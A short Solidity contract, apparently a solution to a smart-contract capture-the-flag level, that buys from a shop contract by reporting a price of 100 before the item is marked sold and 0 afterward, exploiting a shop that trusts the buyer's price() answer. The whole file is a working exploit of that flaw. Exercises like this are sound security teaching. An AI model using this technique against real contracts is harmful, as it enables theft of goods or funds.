// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AngleBuyer {
    function exploit(address shop) external{
        IShop(shop).buy();
    }
    function price() external view returns (uint){
        return IShop(msg.sender).isSold()? 0: 100;
    }
}
interface IShop {
    function buy() external;
    function isSold() view external returns(bool);
}